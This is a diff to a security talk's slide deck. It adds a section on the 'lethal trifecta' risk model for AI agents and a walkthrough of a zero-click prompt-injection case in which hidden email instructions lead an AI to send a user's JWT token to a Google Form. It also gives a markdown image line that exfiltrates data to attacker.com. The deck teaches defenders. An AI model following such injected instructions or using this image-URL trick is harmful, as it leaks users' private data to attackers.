@@ -15,8 +15,7 @@ transition: fade
 layout: agenda
 items:
   - ProbLLMs
-  - Topic Two
-  - Topic Three
+  - The Lethal Trifecta
 ---
 
 ---
@@ -228,6 +227,101 @@ Organizations lower their guard when <i>"it worked last time"</i>
 <!--
 Famously: Diane Vaughan's analysis NASA Challenger disaster (1986), killing 7
 -->
+
+
+
+
+---
+layout: section
+---
+
+# The Lethal Trifecta
+
+::subtitle::
+
+The core security framework
+
+---
+layout: default
+---
+
+# What?
+
+When an AI agent has **all three** simultaneously:
+
+```
+┌─────────────────────────────────────────────────────────┐
+│                  THE LETHAL TRIFECTA                    │
+├─────────────────────────────────────────────────────────┤
+│  1. ACCESS TO PRIVATE DATA                              │
+│     └─ Emails, documents, databases, API keys           │
+│                                                         │
+│  2. EXPOSURE TO UNTRUSTED CONTENT                       │
+│     └─ External emails, shared docs, web pages          │
+│                                                         │
+│  3. EXFILTRATION VECTOR                                 │
+│     └─ Can make external requests, render images        │
+└─────────────────────────────────────────────────────────┘
+
+         If your system has all three → IT'S VULNERABLE
+```
+
+---
+layout: default
+---
+
+# The Root Cause
+
+<div class="text-2xl mb-8 text-orange-400 italic">
+"There is no rigorous way to separate instructions from data."
+</div>
+
+Everything an LLM reads is potentially an instruction.
+
+**This is not a bug - it's the core mechanism that makes LLMs useful.**
+
+<v-click>
+
+### The Fire Triangle Analogy
+
+Like fire needs heat + fuel + oxygen:
+
+| Element | Mitigation |
+|---------|------------|
+| Private Data | Minimize what AI can access |
+| Untrusted Content | Filter/sanitize external inputs |
+| Exfiltration | Block outbound requests |
+
+</v-click>
+
+---
+layout: default
+---
+
+# Real Attack: Superhuman Email (Jan 2026)
+
+**Zero-Click Attack:**
+
+```
+1. Attacker sends email with hidden instructions
+2. User asks AI: "Summarize my inbox"
+3. Hidden instruction tells AI to submit data to Google Form
+4. AI makes request: https://docs.google.com/forms/...?entry=[JWT_TOKEN]
+5. Attacker receives victim's JWT token
+```
+
+<v-click>
+
+**Alternative via markdown:**
+
+```markdown
+![](https://attacker.com/pic.jpg?data=<sensitive_info>)
+```
+
+When LLM outputs this, the client renders it, making the request.
+
+</v-click>
+
 
 
 ---
